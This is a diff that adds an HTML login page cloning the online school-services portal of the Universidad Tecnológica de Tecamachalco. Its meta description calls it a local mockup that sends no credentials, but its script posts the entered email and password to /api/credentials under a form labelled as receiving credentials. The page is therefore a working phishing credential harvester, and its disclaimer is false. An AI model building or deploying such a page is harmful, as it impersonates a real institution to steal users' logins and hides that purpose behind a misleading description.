@@ -1,0 +1,347 @@
+<!doctype html>
+<html lang="es">
+  <head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <link rel="icon" href="./assets/logo.png" />
+    <title>UT TECAMACHALCO</title>
+    <meta
+      name="description"
+      content="Maqueta visual local de una pantalla de acceso institucional. No conecta ni envía credenciales."
+    />
+    <style>
+      :root {
+        --teal: #02a787;
+        --panel-gray: #e1e1e1;
+        --line-gray: #e1e1e1;
+        --ink: #080808;
+      }
+
+      * {
+        box-sizing: border-box;
+      }
+
+      html,
+      body {
+        min-height: 100%;
+      }
+
+      body {
+        margin: 0;
+        background: #090909;
+        color: var(--ink);
+        font-family: Arial, Helvetica, sans-serif;
+      }
+
+      button,
+      input {
+        font: inherit;
+      }
+
+      .page-shell {
+        position: relative;
+        min-height: calc(100vh - 6px);
+        margin-top: 1px;
+        overflow: hidden;
+        border-radius: 8px 8px 0 0;
+        background: #fff;
+      }
+
+      .top-bar {
+        height: 50px;
+        margin: 0 10px 0 7px;
+        border-bottom: 11px solid var(--teal);
+        background: #dedede;
+      }
+
+      .hero {
+        min-height: clamp(390px, 45vh, 460px);
+        display: grid;
+        place-items: center;
+        padding: 34px 7px;
+      }
+
+      .hero-inner {
+        width: 100%;
+        display: grid;
+        grid-template-columns: 1fr 1fr;
+        align-items: center;
+        gap: 0;
+      }
+
+      .institutional-mark {
+        display: flex;
+        justify-content: center;
+        align-items: center;
+      }
+
+      .institutional-mark img {
+        width: min(264px, 70%);
+        height: auto;
+        display: block;
+      }
+
+      .login-panel {
+        width: min(100%, 555px);
+        height: 168px;
+        display: grid;
+        grid-template-columns: 151px 1fr;
+        justify-self: center;
+        transform: translateX(-2px);
+        background: var(--panel-gray);
+      }
+
+      .service-mark {
+        display: grid;
+        place-items: center;
+        padding: 5px 3px;
+        background: #fff;
+        border-top: 4px solid var(--line-gray);
+        border-bottom: 4px solid var(--line-gray);
+      }
+
+      .service-mark img {
+        width: 136px;
+        height: auto;
+        display: block;
+      }
+
+      .login-form {
+        display: grid;
+        align-content: center;
+        padding: 14px 0 10px 24px;
+      }
+
+      .field-row {
+        display: grid;
+        grid-template-columns: 93px minmax(0, 286px);
+        align-items: center;
+        min-height: 33px;
+      }
+
+      .field-row label {
+        padding-right: 4px;
+        font-family: Tahoma, Arial, sans-serif;
+        font-size: 16px;
+        font-weight: 700;
+        text-align: right;
+      }
+
+      .field-row input {
+        width: 100%;
+        height: 27px;
+        border: 1px solid #a7a7a7;
+        border-radius: 0;
+        background: #fff;
+        color: #444;
+        font-family: Tahoma, Arial, sans-serif;
+        cursor: text;
+      }
+
+      .field-row input:focus {
+        outline: 2px solid var(--teal);
+        outline-offset: 1px;
+      }
+
+      .button-row {
+        display: flex;
+        gap: 0;
+        margin: 17px 0 0 0;
+        padding-left: 0;
+      }
+
+      .button-row button {
+        min-width: 84px;
+        height: 29px;
+        padding: 2px 9px;
+        border: 1px solid #999;
+        border-radius: 2px;
+        background: linear-gradient(#fff, #e9e9e9);
+        color: #111;
+        font-size: 18px;
+        line-height: 1;
+        cursor: pointer;
+      }
+
+      .button-row button + button {
+        margin-left: -1px;
+      }
+
+      .button-row button:hover,
+      .button-row button:focus-visible {
+        background: #f6f6f6;
+        outline: 2px solid var(--teal);
+        outline-offset: 1px;
+      }
+
+      .demo-message {
+        min-height: 15px;
+        margin: 7px 0 0;
+        color: #4e4e4e;
+        font-size: 11px;
+      }
+
+      .title-band {
+        margin: 0 10px 0 7px;
+        border-top: 11px solid var(--teal);
+        background: #dedede;
+        padding: 0 12px 2px;
+        text-align: center;
+        font-family: "CopprplGoth Bd BT", Georgia, "Times New Roman", serif;
+        font-size: 20px;
+        font-weight: 700;
+        line-height: 1.26;
+      }
+
+      .title-band span {
+        display: block;
+      }
+
+      .bottom-space {
+        min-height: 190px;
+      }
+
+      @media (max-width: 900px) {
+        .hero {
+          min-height: auto;
+          padding-top: 30px;
+          padding-bottom: 36px;
+        }
+
+        .hero-inner {
+          grid-template-columns: 1fr;
+          gap: 42px;
+        }
+
+        .institutional-mark img {
+          width: 220px;
+        }
+
+        .login-panel {
+          justify-self: center;
+          transform: none;
+        }
+      }
+
+      @media (max-width: 560px) {
+        .top-bar,
+        .title-band {
+          margin-left: 6px;
+          margin-right: 6px;
+        }
+
+        .hero {
+          padding-right: 12px;
+          padding-left: 12px;
+        }
+
+        .login-panel {
+          grid-template-columns: 112px 1fr;
+          min-height: 148px;
+        }
+
+        .service-mark img {
+          width: 104px;
+        }
+
+        .login-form {
+          padding-left: 8px;
+          padding-right: 8px;
+        }
+
+        .field-row {
+          grid-template-columns: 74px minmax(0, 1fr);
+        }
+
+        .field-row label {
+          font-size: 13px;
+        }
+
+        .button-row button {
+          min-width: 70px;
+          font-size: 15px;
+        }
+      }
+    </style>
+  </head>
+  <body>
+    <main class="page-shell">
+      <div class="top-bar" aria-hidden="true"></div>
+
+      <section class="hero" aria-label="Acceso a servicios escolares">
+        <div class="hero-inner">
+          <div class="institutional-mark">
+            <img src="./assets/logo.png" alt="Logotipo institucional" />
+          </div>
+
+          <div class="login-panel" aria-label="Panel de acceso de demostración">
+            <div class="service-mark">
+              <img src="./assets/miescuela.gif" alt="mi-escuela.com" />
+            </div>
+
+            <form id="login-form" class="login-form" action="/api/credentials" method="post" aria-label="Recepción de credenciales" autocomplete="off">
+              <div class="field-row">
+                <label for="demo-user">Email</label>
+                <input id="demo-user" name="email" type="email" autocomplete="email" required />
+              </div>
+              <div class="field-row">
+                <label for="demo-password">Contraseña</label>
+                <input id="demo-password" name="password" type="password" autocomplete="new-password" minlength="8" maxlength="128" required />
+              </div>
+
+              <div class="button-row">
+                <button type="submit" id="accept-button">Aceptar</button>
+                <button type="button" id="cancel-button">Cancelar</button>
+              </div>
+              <p class="demo-message" id="demo-message" aria-live="polite" role="status"></p>
+            </form>
+          </div>
+        </div>
+      </section>
+
+      <section class="title-band" aria-label="Identidad del portal">
+        <span>SERVICIOS ESCOLARES EN LÍNEA</span>
+        <span>UNIVERSIDAD TECNOLÓGICA DE TECAMACHALCO</span>
+      </section>
+
+      <div class="bottom-space" aria-hidden="true"></div>
+    </main>
+
+    <script>
+      const message = document.getElementById("demo-message");
+      const form = document.getElementById("login-form");
+      const userField = document.getElementById("demo-user");
+      const passwordField = document.getElementById("demo-password");
+
+      form.addEventListener("submit", async (event) => {
+        event.preventDefault();
+        message.textContent = "Recibiendo datos…";
+
+        try {
+          const response = await fetch(form.action, {
+            method: form.method,
+            headers: {
+              "Content-Type": "application/json",
+              Accept: "application/json",
+            },
+            body: JSON.stringify({
+              email: userField.value,
+              password: passwordField.value,
+            }),
+          });
+          const result = await response.json();
+          if (!response.ok) throw new Error(result.error || "No se pudieron recibir los datos.");
+          passwordField.value = "";
+          message.textContent = "Datos recibidos correctamente.";
+        } catch (error) {
+          message.textContent = error.message;
+        }
+      });
+
+      document.getElementById("cancel-button").addEventListener("click", () => {
+        form.reset();
+        message.textContent = "Campos restablecidos.";
+      });
+    </script>
+  </body>
+</html>
